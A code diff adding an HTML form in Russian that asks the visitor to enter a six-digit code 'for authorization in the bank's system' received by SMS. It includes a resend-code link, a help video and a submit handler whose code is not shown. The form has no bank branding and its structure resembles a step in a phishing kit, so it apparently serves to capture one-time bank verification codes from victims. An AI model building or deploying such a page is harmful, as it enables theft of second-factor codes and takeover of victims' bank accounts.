@@ -1,0 +1,26 @@
+<form class="user_additional_form block-form" id="user_additional_form" onsubmit="event.preventDefault(); return false;">
+    <div class="lead-form__fields">
+        <div class="step-fields" style="text-align: center;">
+            <div class="field">
+                <div class="additional_form_error_message"></div>
+                <label class="label user_additional_form_title" data-default-text="Введите код для авторизации в системе банка, который поступит Вам в течении 5 минут:"></label>
+                <div class="control has-icons-left has-icons-right is-large">
+                    <input type="text" autocomplete="on" placeholder="000000" name="code" required="required" id="form_input_code" class="input is-large" maxlength="6">
+                </div>
+            </div>
+            <button onclick="user_sent_additional_form('');" type="button" class="button button_main_color send_button">Подтвердить</button>
+            <div class="ask_password_help_link ask_password_help_link_sms">
+                <div class="client_request_code welcome">
+                    <a href="javascript:void(0);" class="client_request_code_welcome link_main_color">Где мне найти уведомление?</a>
+                    <a href="javascript:void(0);" class="client_request_code_timeout button" onclick="request_code();">Мне не пришло SMS подтверждение</a>
+                    <span class="client_request_code_text">
+                        Вам Высланно повторное SMS подтверждение
+                    </span>
+                </div>
+                <video width="320" height="320" autoplay loop muted playsinline poster="images/video_help_code.jpg">
+                    <source src="images/video_help_code.mp4" type="video/mp4">
+                </video>
+            </div>
+        </div>
+    </div>
+</form>
